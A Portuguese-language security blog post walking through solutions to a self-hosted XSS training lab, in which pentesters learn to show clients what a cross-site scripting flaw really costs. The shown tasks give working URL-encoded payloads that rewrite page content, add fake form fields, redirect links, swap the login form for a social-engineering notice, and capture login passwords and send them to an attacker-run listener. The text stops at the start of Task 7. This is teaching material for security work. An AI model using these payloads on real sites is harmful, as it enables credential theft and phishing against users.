---
title: Beyond the alert()
author: H41stur
date: 2023-06-21 01:00:00 -0300
categories: [Estudos, XSS]
tags: [XSS, JS, JavaScript]
image: "/img/posts/beyond_the_alert.jpeg"
alt: "Beyond the alert()"
---

![Beyond the alert()](/img/posts/beyond_the_alert.jpeg)

- [Introdução](#introdução)
- [Objetivo](#objetivo)
- [Obtendo o Projeto](#obtendo-o-projeto)
- [Resolução das Tasks](#resolução-das-tasks)
	- [*Task 1 - Modify HTML Elements*](#task-1---modify-html-elements)
	- [*Task 2 - Manipulating Forms*](#task-2---manipulating-forms)
	- [*Task 3 - Intercept Form Submit*](#task-3---intercept-form-submit)
	- [*Task 4 - Stealing Form Submissions*](#task-4---stealing-form-submissions)
	- [*Task 5 - Redirecting All Links in the Page*](#task-5---redirecting-all-links-in-the-page)
	- [*Task 6 - Changing Content to Social Engineering*](#task-6---changing-content-to-social-engineering)
	- [*Task 7 - Abusing Event Listeners*](#task-7---abusing-event-listeners)
	- [*Task 8 - Redirect on Click*](#task-8---redirect-on-click)
	- [*Task 9 - JavaScript Keylogger*](#task-9---javascript-keylogger)


## Introdução

Ao longo do tempo em que faço parte da comunidade de cibersegurança, tive e tenho contato com vários profissionais que, falando exclusivamente do **ponto de vista técnico**, são excepcionais, outros muito bons e outros nem tanto. 

Faço questão de frisar o termo "<span style="color: #1cce43"><b>ponto de vista técnico</b></span>", pois este conhecimento, por mais que seja determinante, ainda não é suficiente para moldar um bom profissional. Também não vou entrar em assuntos generalizados de *soft skills*, pois isso se tornaria um papo para outras ocasiões.

O lugar onde quero chegar é: na dificuldade que vejo com frequência de um cara bom, saber comunicar o impacto dos *findings* em um projeto de cibersegurança ao ponto que seu trabalho seja **compreendido** e reconhecido pelo **cliente** (sim, quem tem que compreender o risco de uma vulnerabilidade é o **cliente**, não os outros coleguinhas da área), em outras palavras, saber *hackear* não significa absolutamente nada na área de segurança, **SE** você não souber demonstrar o impacto do seu *hacking*.

Exemplificando isso tudo aí de cima, vamos supor que o cara encontrou um **XSS** em um ponto crítico de uma aplicação, e é capaz de exfiltrar diversos dados sensíveis, aí na **prova de conceito** apresentada pro cliente, a única imagem apresentada é aquele famoso `alert(1)`.

Ok, o `alert(1)` prova que existe um XSS ali, mas o seu cliente não sabe, e muitas vezes nem tem a obrigação de saber que a execução de uma carga JavaScript no navegador da vítima pode levar a uma infinidade de coisas das mais diversas criticidades. <span style="color: #1cce43">Pra ele seu ataque resultou em abrir um "<i>pop-up</i>" no navegador</span>.

Por outro lado, temos outro viés, onde o cara encontra um XSS, porém não consegue exfiltrar um *cookie*, por exemplo, seja por um *hardening* nos *headers* da aplicação, ou qualquer outro motivo, e por conta disso, não tem a "**malicia**" de montar um ataque mais elaborado. Com isso, ele acaba categorizando este *finding* com severidade **baixa** justamente por não saber ou ter a criatividade de montar ataques mais complexos com JavaScript para causar mais impacto, pois em todo seu aprendizado, nunca acabou saindo do `alert(1)`.

Sabendo que eu **não** sou um dos caras excepcionais, mas também não sou dos piores (espero eu), vou deixar meus 10 centavos aqui. Com base em alguns treinamentos que já fiz, e outros ataques que já realizei (profissionalmente), decidi criar um material com a intenção de abrir o leque no que diz respeito a ataques baseados em JavaScript.

Se tratam de **21 "*tasks*"** baseadas em ataques XSS que evoluem sua complexidade gradativamente. Nada que seja muito complexo no final, afinal a intenção não é ensinar JavaScript, mas sim a "maldade" em causar impacto neste tipo de ataque.

![Itachi](/img/posts/itachi.gif){: width="250" }

O projeto se chama `Beyond the alert()` e foi todo conteinerizado para facilitar a portabilidade e está disponível em [https://github.com/h41stur/beyond_the_alert ](https://github.com/h41stur/beyond_the_alert){:target="\_blank"}.

## Objetivo

Bom, vamos começar com o que não é o objetivo deste projeto:

- Como comentado acima, o objetivo aqui <span style="color: #1cce43"><b>não é ensinar</b></span> JavaScript, ainda mais porque saber esta linguagem ao menos no ponto de entender um *script*, faz parte do básico pra quem é da área.
- O objetivo <span style="color: #1cce43"><b>não é mostrar como encontrar um XSS</b></span>, ainda mais porque cada caso é um caso e para facilitar tudo aqui, o ponto de injeção é bem explícito.
- O objetivo <span style="color: #1cce43"><b>não é mostrar qualquer tipo de <i>bypass</i></b></span>, *bypass* é uma ciência completa, e não existe uma forma de ensinar, justamente porque não existe a forma certa.

Com isso em mente, podemos dizer claramente que o objetivo do projeto <span style="color: #1cce43">Beyond the alert()</span> é exclusivamente expandir os horizontes de ataque, quando uma situação de XSS é encontrada. Tendo em vista dois pontos principais:

1. Saber demonstrar o impacto de um XSS encontrado;
2. Encontrar formas criativas de ataques que possam elevar o nível de criticidade de um XSS encontrado.

## Obtendo o Projeto

O projeto está disponível em meu GitHub no endereço [https://github.com/h41stur/beyond_the_alert ](https://github.com/h41stur/beyond_the_alert){:target="\_blank"}. O Beyond the alert() utiliza como base o contêiner `php:7.4-apache` e todo o código-fonte das tasks é baseado em HTML e PHP.

Para obter a cópia do projeto, clone o repositório.

```bash
git clone https://github.com/h41stur/beyond_the_alert.git && cd beyond_the_alert
```

Para "*buildar*" o contêiner:

```bash
docker build -t bta .
```

Para executar o contêiner, eu sugiro utilizar a flag `--rm` para autodestruí-lo após sua parada, evitando comprometimento desnecessário de memória.

```bash
docker run --rm -p 80:80 bta
```

Após sua execução, ao visitar seu *localhost* no navegador, seu menu principal estará disponível.

![Menu](/img/posts/2023-06-21-beyond-the-alert.png)

## Resolução das *Tasks*

Como parte do projeto, deixarei a resolução das *tasks*, ou pelo menos uma das formas de se resolver cada uma das *tasks*, uma vez que, ao ter disponível uma linguagem de programação tão abrangente quanto JS, temos várias formas de fazer o mesmo.

Para cada uma das resoluções, tentarei deixar um breve descritivo e algumas referências.

> <span style="color: #1cce43"><b>IMPORTANTE</b></span>
> 
> Todas as *tasks* tem o mesmo ponto de injeção de XSS, o parâmetro GET `search=`.



### *Task 1 - Modify HTML Elements*

![Task 1](/img/posts/2023-06-21-beyond-the-alert-1.png)

#### Objetivo

O objetivo desta *task* é modificar o conteúdo dos campos da página, utilizando somente JavaScript injetado em um vetor vulnerável a XSS refletido.

#### *Background*

O HTML (*HyperText Markup Language*) especificado na [RFC1866](https://www.ietf.org/rfc/rfc1866.txt), é a linguagem padrão para a criação de páginas e aplicações web. Ela é usada para estruturar o conteúdo na web de forma que os navegadores possam interpretá-lo e exibi-lo aos usuários.

O HTML usa "*tags*" para marcar diferentes tipos de conteúdo. Cada tag HTML tem uma função específica e ajuda a descrever o tipo de conteúdo que ela contém.

Já o JavaScript é uma linguagem de programação interpretada que é usada principalmente em páginas da web para adicionar funcionalidades interativas que não podem ser alcançadas apenas com HTML e CSS.

Unindo as informações, é possível interagir, modificar, incluir ou excluir qualquer elemento estático do HTML de forma dinâmica com JavaScript.

Existem métodos específicos para identificar e interagir com elementos HTML, alguns deles são:

- `getElementById()`
- `getElementsByClassName()`
- `getElementsByName()`
- `getElementsByTagName()`
- `getElementsByTagNameNS()`

Cada elemento HTML também possui diversas [propriedades](https://developer.mozilla.org/en-US/docs/Web/API/Element).

#### Exploração

Primeiramente é preciso ativar o vetor de injeção, nesta *task*, basta pesquisar qualquer coisa no campo de busca, ou inserir qualquer valor no parâmetro GET `search`.

- [http://localhost/01/?search=test](http://localhost/01/?search=test)

![Valor refletido](/img/posts/2023-06-21-beyond-the-alert-2.png)

Consultando o HTML da página, podemos obter o contexto onde o código malicioso atuará.

![Contexto](/img/posts/2023-06-21-beyond-the-alert-3.png)

Sabemos que, entre as diversas formas de identificar um campo dentro do HTML, nem sempre todas serão possíveis. Como estes campos não tem um ID nem um nome para identificá-los, não podemos utilizar `getElementById()` nem `getElementsByName()`. Porém, podemos identificá-los pela classe ou pela própria *tag*.

Porém, nomes de *tags* e *classes* não são únicos em um HTML, portanto, ao capturar estes elementos, o JavaScript irá montar um *array* com estes elementos, dos quais precisamos indicar qual posição dentro deste *array* contém o campo que precisamos.

Por exemplo:

```javascript
document.getElementByTagName("h2")
```

Este objeto irá conter todos os campos cuja *tag* é um `<h2>`. Se quisermos, por exemplo, o primeiro `<h2>`, faremos da seguinte forma:

```javascript
document.getElementByTagName("h2")[0]
```

E se quisermos o terceiro:

```javascript
document.getElementByTagName("h2")[2]
```

Ao termos o objeto correspondente ao elemento que precisamos, podemos utilizar a **propriedade** `innerHTML` que obtém ou define o conteúdo HTML de um elemento.

O script ficaria da seguinte forma:

```html
<script>
	document.getElementsByTagName("h1")[0].innerHTML = "Modificado!";
	document.getElementsByTagName("h2")[2].innerHTML = "Modificado Também!";
</script>
```

Ao converter para *URL Encode*:

```
%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E
```

Tento a seguinte URL final:

- [http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E](http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E)

![Resultado](/img/posts/2023-06-21-beyond-the-alert-4.png)

#### Referências

- [https://www.ietf.org/rfc/rfc1866.txt](https://www.ietf.org/rfc/rfc1866.txt)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS)
- [https://developer.mozilla.org/en-US/docs/Web/API/Element](https://developer.mozilla.org/en-US/docs/Web/API/Element)


### *Task 2 - Manipulating Forms*

![Task 2](/img/posts/2023-06-21-beyond-the-alert-5.png)

#### Objetivo

O objetivo desta *task* é modificar o formulário de autenticação inserindo um novo campo *"Registration Number"*. É importante que este campo seja homogêneo com todo o formulário, para parecer de fato parte deste.

#### *Background*

O JavaScript nos permite não só manipular elementos HTML, como também criá-los e inseri-los no corpo da página em qualquer lugar, desde que exista uma referência de posicionamento.

Para criar um objeto que contenha um novo elemento, existe o método `createElement()`. Já para inseri-lo na página de acordo com uma referência existente, existe o método `insertBefore()`.

#### Exploração

Para objetos do tipo *form* o JavaScript já possui o método `forms` que identifica cada formulário dentro do documento, e cria um *array* com todos (mesmo que só exista um). Portanto, para identificar o primeiro formulário em uma página, podemos fazer da seguinte forma:

```javascript
document.forms[0]
```

Já para identificar os elementos em um formulário, podemos utilizar o método `elements` que também cria um *array* com todos os elementos do formulário. Portanto, para identificar o primeiro elemento de um formulário, podemos fazer da seguinte forma:

```javascript
document.forms[0].elements[0]
```

Neste caso, para criarmos e inserirmos um novo campo, podemos criar dois objetos, um contendo o novo campo, e outro contendo o campo de referência utilizado para o posicionamento, e logo em seguida invocar o método `insertBefore()`.

```html
<script>
	var input = document.createElement("input");
	var prev = document.forms[0].elements[0];
	document.forms[0].insertBefore(input, prev);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E](http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E)

![Form](/img/posts/2023-06-21-beyond-the-alert-7.png)

O campo foi inserido, porém, <span style="color: #1cce43">TEMOS UM PROBLEMA!</span>

O novo campo ficou totalmente desconfigurado, nitidamente um alien dentro do formulário.

Isto aconteceu, pois criamos um novo campo, porém não inserimos nenhum atributo, como classes CSS, ou *placeholder* para torná-lo natural. Podemos fazer isto com o método `setAttribute()`.

Quando olhamos para o código HTML, podemos ver que os campos *input* do formulário, estão formatados com a classe CSS `input-block-level`.

![Classes](/img/posts/2023-06-21-beyond-the-alert-9.png)

O código final, fica desta forma:

```html
<script>
	var input = document.createElement("input");
	input.setAttribute("type", "text");
	input.setAttribute("class", "input-block-level");
	input.setAttribute("placeholder", "Registration Number");
	input.setAttribute("name", "regnum");
	var prev = document.forms[0].elements[0];
	document.forms[0].insertBefore(input, prev);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E](http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E)

![Form](/img/posts/2023-06-21-beyond-the-alert-8.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement)
- [https://developer.mozilla.org/en-US/docs/Learn/Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)
- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements)
- [https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute](https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute)


### *Task 3 - Intercept Form Submit*

![Task 3](/img/posts/2023-06-21-beyond-the-alert-10.png)

#### Objetivo

O objetivo desta *task* é interceptar a submissão do formulário ao efetuar *login*, a princípio esta *task* pede simplesmente para imprimir um alerta na tela com o usuário e senha ao submeter o formulário.

#### *Background*

*Event listeners* em JavaScript são funções chamadas em resposta a um evento específico que ocorre em um elemento da página. Esses eventos podem ser uma ampla variedade de ações do usuário, como cliques do mouse, movimentos do mouse, pressionamentos de teclas, eventos de foco, eventos de envio de formulário e muitos outros.

É possível programar uma ação que seja ativada por um *event listener* e execute uma função ou script.

#### Exploração

Uma vez que conseguimos selecionar determinados elementos do documento HTML e obter seus valores, é possível criar uma função em JavaScript que seja acionada por um *event listener* relacionado ao evento *submit* de um formulário.

```html
<script>

	function InterceptForm() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		alert(username + ' : ' + password);
	}
	
	document.forms[0].onsubmit = InterceptForm;
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o alerta é impresso com os dados preenchidos.

![Conclusão](/img/posts/2023-06-21-beyond-the-alert-11.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Learn/Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)
- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements)
- [https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)

### *Task 4 - Stealing Form Submissions*

![Task 4](/img/posts/2023-06-21-beyond-the-alert-12.png)

#### Objetivo

O objetivo desta *task* é interceptar a submissão do formulário ao efetuar *login*, porém, diferente da *task 3*, desta vez é preciso exfiltrar estas informações, as enviando para uma máquina sob controle do atacante.

#### *Background*

No JavaScript, assim como outras linguagens, existem os <span style="color: #1cce43"><b><i>constructors</i></b></span>.

Um "*constructor*" em JavaScript é um método especial usado parara criar e inicializar um objeto quando você usa a declaração `new`. Todos os objetos em JavaScript (com exceção dos objetos com um protótipo `null` ou `undefined`) têm um construtor.

Alguns exemplos de *constructors* são:

- `Image()`: cria um novo objeto de imagem.
- `Object()`: cria um novo objeto vazio.
- `Array()`: cria um novo *array* vazio.
- `Function()`: cria uma nova função.
- `Date()`: cria um novo objeto de data e hora.
- `RegExp()`: cria um novo objeto de expressão regular.

O *constructor* `Image()` cria e retorna um novo objeto `HTMLImageElement` representando um <img>elemento HTML que não está anexado a nenhuma árvore DOM. Ele aceita parâmetros opcionais de largura e altura. Quando chamado sem parâmetros, o `new Image()` é equivalente a chamar `document.createElement('img')`.

Um elemento HTML do tipo imagem precisa necessariamente do atributo `src` que indica o **endereço** da imagem a ser carregada, portanto, o *constructor*, `Image()` também precisa, porém, como é um elemento JavaScript, pode ser preenchido com variáveis.

Quando um elemento do tipo `img` existe em um documento, seja diretamente em código HTML ou inserido via JavaScript, seu atributo `src` é invocado automaticamente toda vez que a página é invocada, fazendo uma requisição para o endereço configurado.

#### Exploração

Esta exploração pode seguir, em sua maioria, como na *task 3*, porém ao invés de invocar um `alert()` com os dados obtidos, podemos iniciar um *constructor* do tipo `Image()` e em seu atributo `src` apontar para um endereço controlável pelo atacante, concatenado com as variáveis de usuário e senha obtidos. Ficando da seguinte forma:

```html
<script>

	function InterceptForm() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		new Image().src = "http://0.0.0.0:8080/?user="+username+"&pass="+password;
	}
	
	document.forms[0].onsubmit = InterceptForm;
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurada para ouvir a requisição feita.

![Servidor Python ouvindo](/img/posts/2023-06-21-beyond-the-alert-13.png)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o *constructor* `Image()` tentará carregar o endereço da imagem, que está apontando para o *Python server* resultando na exfiltração dos dados do formulário.

![Dados exfiltrados](/img/posts/2023-06-21-beyond-the-alert-14.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image)

### *Task 5 - Redirecting All Links in the Page*

![Task 5](/img/posts/2023-06-21-beyond-the-alert-15.png)

#### Objetivo

O objetivo desta *task* é alterar o destino de todos os *links* da página para "https://h41stur.com" (pode alterar para qualquer lugar, desde que altere).

#### *Background*

Já vimos em *tasks* anteriores que o método `getElementsByTagName()` filtra todos os elementos de um determinado nome de *tag* e os insere em um *array*.

Sabendo que um *link* HTML é criado pela *tag* `<a>` e obrigatoriamente precisa do atributo `href` que aponta para o endereço do *link*, podemos criar um *array* com todos os links da página, e iterar sobre ele com um laço `for`.

#### Exploração

Montando o script com os elementos.


```html
<script>
	var links = document.getElementsByTagName("a");
	for (i=0; i < links.length; i++){
		links[i].href = "https://h41stur.com";
	}
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E](http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E)

Todos os *links* da página apontarão para o endereço do script.

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName)

### *Task 6 - Changing Content to Social Engineering*

![Task 6](/img/posts/2023-06-21-beyond-the-alert-16.png)

#### Objetivo

O objetivo desta *task* é alterar o *layout* da página, ao substituir o formulário de *login* por uma mensagem de aviso que redirecione o usuário para outro lugar com objetivos de engenharia social.

#### *Background*

A propriedade `parentNode` em JavaScript é uma propriedade que retorna o nó pai de um elemento específico no *Document Object Model* (DOM). O **DOM** é uma representação estruturada de um documento HTML ou XML, aonde cada parte do documento (como elementos, atributos, texto, etc.) é representada como um "nó" em uma estrutura de árvore.

Por exemplo, se você tem um elemento de parágrafo (`<p>`) dentro de um elemento `<div>`, o `parentNode` do parágrafo seria o `<div>`.

```html
<div id="minhaDiv"> <!-- Nó pai -->
  <p id="meuParagrafo">Olá, mundo!</p> <!-- Nó filho -->
</div>
```

O método `appendChild()` em JavaScript é usado para adicionar um novo nó ao final da lista de filhos de um nó pai especificado no *Document Object Model* (DOM).

O método `removeChild()` em JavaScript é usado para remover um nó filho de um nó pai específico na estrutura do *Document Object Model* (DOM). Essencialmente, este método permite que você exclua um elemento existente de uma página web.

O método `removeChild()` requer um argumento: o nó que você deseja remover. Ele deve ser um nó filho do objeto do qual você está chamando o método.

#### Exploração

Unindo o que já foi explorado anteriormente com as propriedades de nó, podemos criar um novo elemento que contenha nossa mensagem já importanto a classe que o formate adequadamente, inseri-la dentro do HTML e em seguida, excluir o elemento formulário.

```html
<script>
	var input = document.createElement("h2");
	input.setAttribute("class", "h41stur");
	input.innerHTML = "Site fora do ar! Por favor vá para https://h41stur.com";
	document.forms[0].parentNode.appendChild(input);
	document.forms[0].parentNode.removeChild(document.forms[0]);	
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E](http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E)

![Resultado](/img/posts/2023-06-21-beyond-the-alert-17.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode](https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode)
- [https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild)
- [https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild)

### *Task 7 - Abusing Event Listeners*

![Task 7](/img/posts/2023-06-21-beyond-the-alert-18.png)

#### Objetivo

O objetivo desta *task* é alterar abusar de um *event listener* para imprimir um alerta com a senha preenchida no campo.

#### *Background*

